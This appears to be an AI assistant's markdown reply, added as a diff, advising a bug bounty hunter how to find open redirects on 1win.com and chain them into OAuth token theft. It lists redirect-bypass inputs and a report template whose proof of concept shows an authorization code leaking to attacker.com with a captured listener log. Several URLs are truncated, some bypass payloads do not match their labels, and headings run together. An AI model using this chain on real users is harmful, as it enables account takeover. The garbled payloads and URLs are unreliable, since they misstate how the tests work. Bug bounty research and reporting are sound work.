@@ -1,0 +1,76 @@
+This list targets potential Open Redirect mechanisms. An Open Redirect vulnerability occurs when a web application accepts a user-controlled parameter specifying a destination URL and redirects the user to that URL without proper domain validation. [1, 2] 
+According to 1win's program policies, standard Open Redirects or simple user-facing redirections are strictly out of scope and are classified under the Scope Exclusions (Core Ineligible Findings) or Framing/Clickjacking/Social Engineering boundaries. They do not receive bounties or tracking numbers unless they directly chain into a higher-severity flaw like OAuth token leakage or session hijacking.
+------------------------------
+## High-Surface Parameter Mapping from your List
+When reviewing redirection logic, standard parameter variables (?open=register) simply handle client-side rendering views. Focus instead on variables explicitly processing domain contexts or external routing paths.
+## 1. Decoded Base64 Redirection Metadata
+
+* https://1win.com...
+* Why it stands out: The redirect_data query string base64-decodes into a tracking JSON array containing parameters like "type": "auth". If the internal JavaScript routing engine extracts a destination URL field from this decoded metadata block to handle session transitions, validation bypasses can be tested inside the payload array.
+
+## 2. Explicit Domain Assignment Fields
+
+* https://1win.com/affiliate:link_visit?visit_domain=1win.com
+* https://1win.com/fss/config?domain=1win.com&keys=web
+* Why they stand out: Parameters labeled visit_domain or domain instruct the internal state engine which domain properties to load or communicate with. While often tied to server-side processing (SSRF), if the client engine forces a hard page routing location update (window.location) to this parameter value, it acts as a redirect.
+
+## 3. Integrated Third-Party Integration URLs
+
+* https://1win.com&...
+* Why it stands out: Seamless third-party gaming applications use parameter mappings like lobbyUrl to know where to return a user when they close a game panel.
+
+------------------------------
+## Step-by-Step Safe Verification Framework
+To test if a redirect parameter safely validates target domains without generating high traffic or disrupting production sessions, use a strict verification boundary.
+## Step 1: Client-Side Routing Evaluation
+Input a distinct external domain into the target parameter to observe if the browser initiates a location update.
+
+* Action: Modify the destination variable to point to an external monitoring address:
+?visit_domain=example.com (or &lobbyUrl=https://example.com)
+* Safe Observation: Pay attention to the location bar and browser history states. If the browser redirects directly to example.com, the application is executing a raw redirection.
+
+## Step 2: Protocol and Whitelist Testing
+Determine if the application filters or strings check target domains using standard bypass validations.
+
+* Action: Attempt standard context breakout sequences to see if the validation logic is flawed:
+* Subdomain mapping: ?visit_domain=://example.com
+   * Parameter backslash injection: ?visit_domain=1win.com\.example.com
+   * Path string manipulation: ?visit_domain=://1win.com
+* Safe Observation: If the application forces you back to the main 1win.com landing page or throws an invalid route handling error, it utilizes strong destination domain whitelisting.
+
+------------------------------
+## Chaining Analysis: Elevating Impact to High Severity
+Because standard Open Redirects are out of scope, a submission is only valid if you can safely demonstrate critical asset impact—such as chaining it with an Account Takeover (ATO) scenario via OAuth token theft.
+## Critical Chain Vector
+Look at your OAuth tracking paths:
+https://1win.com...
+If you modify the inner "redirect":"/" path string inside the JSON array to point to your external domain ("redirect":"https://your-testing-host.com"), check if the Google OAuth completion handler redirects to your server while appending the sensitive authentication code or token to the URL query parameters. If it does, you have proven a critical credential leakage path.
+------------------------------
+## HackerOne Markdown Template for Valid Chained Redirections
+If your manual parameter validation proves that the redirect logic leaks critical session or identity tokens to an external host, document the vulnerability using this template:
+
+# Account Takeover via OAuth Token Leakage through Broken Redirection Validation## SummaryAn open redirection validation vulnerability exists within the OAuth state management framework at `[Insert Endpoint Path]`. The application decodes user-supplied JSON matrices inside the `state` parameter block but fails to validate the nested `redirect` destination domain string. An attacker can manipulate this parameter to cause the platform's authentication handlers to leak active provider codes to an external domain, resulting in potential Account Takeover.
+## Target Asset*   **Vulnerable URL**: `https://1win.com/[Insert-OAuth-Path]`
+*   **Affected Parameter Block**: `state` -> `[nested redirect key]`*   **Severity Tier**: High (Account Takeover category - \$1,500 bounty)
+## Pre-requisites*   Two distinct researcher accounts registered using official program email aliases.*   An external logging request host under the control of the researcher.
+## Step-by-Step Reproduction Instructions1. Craft an authentication URL structure pointing to the platform's login processor, altering the embedded redirection parameters to point to your external listening server:
+   `https://1win.com[provider]?state={"redirect":"https://your-listening-host.com"}`2. Execute the authentication process using an active test session, keeping traffic under the **5 requests per second** limit.3. Observe the browser network traffic loop as the provider validates your authentication.4. Verify your external listener logs to confirm if the secret validation code was appended to your third-party address.
+## Proof of Concept (PoC)```http
+GET /oauth/google?state=%7B%22redirect%22%3A%22https%3A%2F%2Fattacker.com%22%7D&code=4%2F0AcvD... HTTP/1.1
+Host: 1win.com
+Connection: close
+```
+### Log capture from external server:```text
+[TIMESTAMP] Incoming HTTP request from victim browser context:
+GET /?code=4%2F0AcvDMrDXP_IwuhUsiqilIy... HTTP/1.1
+Host: attacker.com
+```
+## ImpactBy convincing a target user to initiate a login loop using the altered parameters, an attacker can extract authorization tokens directly into an external context. This allows the attacker to replay the tokens and hijack the target session state, violating isolation controls.
+## Suggested Remediation*   **Strict Redirect Mapping**: Enforce an explicit server-side whitelist for all dynamic tracking redirection parameters. Do not allow full arbitrary URLs or protocol changes inside parameters like `redirect_data` or `lobbyUrl`.
+*   **Relative Path Enforcement**: Restrict user-supplied rendering routing strings to absolute relative local paths (e.g., forcing strings to start with an explicit singular forward slash `/` while stripping out any absolute components like `http:` or `//`).
+
+------------------------------
+If you are currently evaluating the decoding outputs of complex tracking parameters like redirect_data or observing how the application behaves when you change destinations, let me know what specific parameters you are updating or if tokens appear in the resulting URL string. I can help you determine if the behavior constitutes a valid, high-impact chain safely.
+
+[1] [https://www.youtube.com](https://www.youtube.com/watch?v=LQkkrAw4p-U)
+[2] [https://medium.com](https://medium.com/@hinan.mohamed/how-i-found-my-first-open-redirect-vulnerability-592aacbf6574)
